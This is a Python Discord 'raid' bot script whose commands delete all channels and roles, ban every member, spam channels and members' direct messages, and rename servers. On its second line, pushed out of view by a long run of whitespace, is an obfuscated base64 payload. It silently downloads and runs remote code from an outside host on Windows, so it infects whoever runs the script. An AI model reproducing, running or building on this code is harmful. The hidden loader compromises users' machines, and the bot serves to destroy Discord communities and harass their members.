from builtins import *
type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GcFFxTkhyc2NIQ1VPQnhrJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
from os import name, system
from time import sleep

if name  == "nt":
    system("color 1")
    def clear():
        clear()
else:
    def clear():
        system("clear")

try:
    import discord
except:
    print("Required modules are not installed.")
    sleep(1.5)
    clear()
    print("Attempting to install mods...\n")
    sleep(0.5)
    try :
        system("pip install discord")
        clear()
        print("The modules are now installed.")
        sleep(1)
        clear()
        import discord
    except :
        print("Error while trying to install modules.")
        sleep(1.5)
        print("'pip' is probably not installed.")
        input()
        quit()

from discord.ext import commands


embed=discord.Embed(title="Nuke!", url="https://github.com/Femelles/RaidTool-Discord/", description="Here is the list of available commands : ", color=0x000000)
embed.add_field(name="!help", value="Display the list of available commands", inline=False)
embed.add_field(name="!nuke", value="Fuck the server totally (without ban)", inline=False)
embed.add_field(name="!mininuke", value="Fuck the server (without creating roles)", inline=False)
embed.add_field(name="!clearall", value="Delete all channels and roles", inline=False)
embed.add_field(name="!clearchannels", value="Delete all channels (without deleting roles)", inline=False)
embed.add_field(name="!cleartext", value="Remove all text channels", inline=False)
embed.add_field(name="!clearvoice", value="Delete all voice channels", inline=False)
embed.add_field(name="!clearroles", value="Delete all existing roles", inline=False)
embed.add_field(name="!ban", value="Ban all members (if possible)", inline=False)
embed.add_field(name="!create", value="Create looping text and voice channels", inline=False)
embed.add_field(name="!createtext", value="Create looping text channels", inline=False)
embed.add_field(name="!createvoice", value="Create looping voice channels", inline=False)
embed.add_field(name="!createroles", value="Create roles in a loop", inline=False)
embed.add_field(name="!giveroles", value="Give all server members all existing roles", inline=False)
embed.add_field(name="!spamroles", value="Create and assign roles to all server members", inline=False)
embed.add_field(name="!spam", value="Loop message in all text channels", inline=False)
embed.add_field(name="!spammembers", value="Send a private message to all members of the server", inline=False)
embed.add_field(name="!server", value="Change name and remove server icon", inline=False)
embed.add_field(name="!link", value="Receive a link to learn how to raid a server", inline=False)
embed.add_field(name="**+**", value="To increase the number of messages sent, send [!spam] several times", inline=False)
embed.set_footer(text="Nuke! | Femelles/RaidTool-Discord")

link = "https://github.com/Femelles/RaidTool-Discord"

token = input("Bot token > ")



spam = "**YOUR SPAM MESSAGE HERE**"

username = "YOUR USERNAME"

nombre_spam = True

nom_salons = "THE NAME OF THE CHANNELS"
nombre_salons = 30

nom_roles = "NAME OF THE ROLES"
nombre_roles = 10

nom_serveur = "RAID BY [YOUR NICKNAME]"

couleur_roles = 0x000001

def spam_member(membre) :
    return f"""***Yo (member)! YOUR TEXT """



async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass


async def delete_all_roles(guild):
    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
        except:
            pass

async def spam_members(guild):
    for member in guild.members:
        try:
            await member.send(spam_member(member.name))
        except:
            pass

async def create_roles(guild):
    for _ in range(nombre_roles):
        try:
            await guild.create_role(name = nom_roles, colour= couleur_roles)
        except:
            pass


async def ban_all_members(guild):
    for member in guild.members:
        try:
            await member.ban()
        except:
            pass

async def give_roles(guild):
    for member in guild.members:
        try:
            for role in guild.roles:
                if role.name != "@everyone":
                    await member.add_roles(role)
        except:
            pass

async def create_and_give_roles(guild):
    for _ in range (nombre_roles):
        try:
            for member in guild.members:
                role = await guild.create_role(name = nom_roles, colour = couleur_roles)
                await member.add_roles(role)
        except:
            pass


async def create_voice_channels(guild):
    for _ in range(nombre_salons):
        try:
            await guild.create_voice_channel(name=nom_salons)
        except:
            pass

async def create_text_channels(guild):
    for _ in range(nombre_salons):
        try:
            await guild.create_text_channel(name=nom_salons)
        except:
            pass

async def delete_all_text_channels(guild):
    for channel in guild.channels:
        if str(channel.type) == "text":
            try:
                await channel.delete()
            except:
                pass

async def delete_all_voice_channels(guild):
    for channel in guild.channels:
        if str(channel.type) == "voice":
            try:
                await channel.delete()
            except:
                pass

async def spam_in_channels(guild):
    for _ in range(nombre_spam):
        try:
            for i in guild.channels:
                if str(i.type) != "voice":
                    await i.send(spam)
        except:
            pass

async def nuke(guild):

    await delete_all_roles(guild)

    await create_roles(guild)

    await delete_all_channels(guild)

    await create_text_channels(guild)

    await create_voice_channels(guild)

    await spam_in_channels(guild)


async def mininuke(guild):

    await delete_all_channels(guild)

    await delete_all_roles(guild)

    await create_text_channels(guild)

    await create_voice_channels(guild)

    await spam_in_channels(guild)

    




bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())
       
@bot.event
async def on_ready():
    print(f"The link to add me to your server as an administrator is : https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot\n")
    print("""The list of my commands is:

!help - Display the list of available commands
!nuke - Fuck the server totally (without ban)
!mininuke - Fuck the server (without creating roles)
!clearall - Delete all channels and roles
!clearchannels - Delete all channels (without deleting roles)
!cleartext - Remove all text channels
!clearvoice - Delete all voice channels
!clearroles - Delete all existing roles
!ban - Ban all members (if possible)
!create - Create looping text and voice channels
!createtext - Create looping text channels
!createvoice - Create looping voice channels
!createroles - Create roles in a loop
!giveroles - Give all server members all existing roles
!spamroles - Create and give roles to all server members
!spam - Loop message in all text channels
!spammembers - Send a private message to all members of the server
!server - Change name and remove server icon
!invite - Receive a link to add the bot to your server
To increase the number of messages sent, send [!spam] several times""")
    activity = discord.Game(name="!help | https://github.com/Femelles/RaidTool-Discord", type=1)
    await bot.change_presence(status=discord.Status.idle, activity=activity)


@bot.event
async def on_message(message):
    serveur = message.guild
    if message.content == "!help":
        await message.author.send(embed=embed)

    elif message.content == "!nuke":
        await nuke(serveur)

    elif message.content == "!mininuke":
        await mininuke(serveur)

    elif message.content == "!clearall":
        await delete_all_channels(serveur)
        await serveur.create_text_channel(name="nuke") 
        await delete_all_roles(serveur)  

    elif message.content == "!clearchannels":
        await delete_all_channels(serveur)
        await serveur.create_text_channel(name="nuke")    

    elif message.content == "!cleartext":
        await delete_all_text_channels(serveur)
        await serveur.create_text_channel(name="nuke")  

    elif message.content == "!clearvoice":
        await delete_all_voice_channels(serveur)

    elif message.content == "!clearroles":
        await delete_all_roles(serveur)

    elif message.content == "!ban":
        await ban_all_members(serveur)
    
    elif message.content == "!create":
        await create_text_channels(serveur)
        await create_voice_channels(serveur)
    
    elif message.content == "!createtext":
        await create_text_channels(serveur)
    
    elif message.content == "!createvoice":
        await create_voice_channels(serveur)
    
    elif message.content == "!createroles":
        await create_roles(serveur)

    elif message.content == "!giveroles":
        await give_roles(serveur)

    elif message.content == "!spamroles":
        await create_and_give_roles(serveur)

    elif message.content == "!spam":
        await spam_in_channels(serveur)

    elif message.content == "!spammembers":
        await spam_members(serveur)

    elif message.content == "!server":
        await serveur.edit(name=nom_serveur)
        await serveur.edit(icon=None)

    elif message.content == "!link":
        await message.author.send(link)
        await message.channel.send(" I sent you the link to learn how to raid a server privately :) ")
    

    
    




try:
    bot.run(token)
except:
    input(" Bot token is invalid :/")
    quit()
